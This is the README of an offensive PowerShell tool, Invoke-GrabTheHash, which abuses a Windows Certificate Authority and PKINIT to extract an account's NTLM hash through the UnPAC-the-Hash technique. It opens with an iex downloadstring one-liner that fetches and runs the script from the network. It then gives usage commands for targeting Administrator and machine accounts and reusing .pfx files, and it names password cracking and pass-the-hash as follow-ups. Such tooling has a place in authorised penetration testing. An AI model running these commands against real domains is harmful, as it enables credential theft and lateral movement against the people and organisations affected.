# Invoke-GrabTheHash
Requests a certificate from a Windows Certificate Authority (CA) for the User or Machine Account TGT held in your current session, uses PKINIT to obtain a TGT for the same Account, then performs the UnPAC-the-Hash technique to extract the Account's NTLM hash.

This approach can be valuable in situations where an account's TGT has been compromised. Gaining access to the account hash allows for further actions such as cracking it to retrieve the account plain-text password, pass-the-hash attacks, or acquiring a new TGT if the existing one has expired.

### Run as follows
```
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Leo4j/Invoke-GrabTheHash/main/Invoke-GrabTheHash.ps1')
```
```
Invoke-GrabTheHash
```

### Specify a target Domain
```
Invoke-GrabTheHash -Domain ferrari.local
```

### Enumerate for Certificate Templates
```
Invoke-GrabTheHash -CertTemplates
```

### Specify a Certificate Template to use
By default, the "User" or "Machine" template is used to request a certificate
```
Invoke-GrabTheHash -TemplateName User
```

### Specify the CA Name
```
Invoke-GrabTheHash -CAName "CA01.ferrari.local\ferrari-CA01-CA"
```

### Specify the Account Client Name
This must correspond to the TGT Client Name in your current session
```
Invoke-GrabTheHash -CN Administrator
```

### Work with a Machine Account
Make sure you run on an elevated context or it will fail
```
Invoke-GrabTheHash -Machine
```

### Provide a .pfx file
You can also reuse a previously obtained .pfx to get the user hash

Make sure you provide the full path to the .pfx file, as well as the CN and Domain information
```
Invoke-GrabTheHash -PFX C:\Users\Senna\Downloads\Administrator.pfx -Domain ferrari.local -CN Administrator
```

### Example Output
![image](https://github.com/Leo4j/Invoke-GrabTheHash/assets/61951374/da1964e6-2159-42cd-838e-b8d400617cb2)

![image](https://github.com/Leo4j/Invoke-GrabTheHash/assets/61951374/2e887daf-865a-4813-9930-f32815ee653b)

### Credits

Rubeus

https://github.com/GhostPack/Rubeus
